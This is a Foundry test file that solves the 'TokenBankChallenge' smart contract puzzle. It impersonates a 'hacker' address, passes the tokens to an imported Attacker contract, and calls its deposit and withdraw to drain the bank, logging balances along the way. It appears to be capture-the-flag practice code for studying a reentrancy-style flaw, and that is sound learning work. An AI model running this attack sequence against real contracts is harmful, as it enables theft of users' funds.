// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {TokenBankChallenge, SimpleERC223Token} from "src/Miscellaneous/TokenBalance.sol";
import {Attacker} from "./TokenBalanceAttacker.sol";

contract TokenBankChallengeTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        tokenBankChallenge = new TokenBankChallenge(hacker);
        // used to deploy contract.
        payable(hacker).transfer(1 ether);
    }

    function testAssumeOwnership() public {
        console.log(
            "before hack, isComplete:",
            tokenBankChallenge.isComplete()
        );

        vm.startPrank(hacker);
        Attacker attacker = new Attacker(address(tokenBankChallenge));

        tokenBankChallenge.withdraw(tokenBankChallenge.balanceOf(hacker));
        console.log(
            "hacker token balance:",
            tokenBankChallenge.token().balanceOf(hacker)
        );

        tokenBankChallenge.token().transfer(
            address(attacker),
            tokenBankChallenge.token().balanceOf(hacker)
        );
        console.log(
            "attacker token balance:",
            tokenBankChallenge.token().balanceOf(address(attacker))
        );

        attacker.deposit();
        console.log("after deposit");
        console.log(
            "attacker token balance:",
            tokenBankChallenge.token().balanceOf(address(attacker))
        );
        console.log(
            "attacker deposited to bank:",
            tokenBankChallenge.balanceOf(address(attacker))
        );

        attacker.withdraw();

        vm.stopPrank();

        console.log(
            "after hack, isComplete:",
            tokenBankChallenge.isComplete()
        );

        console.log(
            "hacker token balance:",
            tokenBankChallenge.token().balanceOf(hacker)
        );
        console.log(
            "bank token balance:",
            tokenBankChallenge.token().balanceOf(address(tokenBankChallenge))
        );
        console.log(
            "attacker token balance:",
            tokenBankChallenge.token().balanceOf(address(attacker))
        );

        assertTrue(tokenBankChallenge.isComplete());
    }
}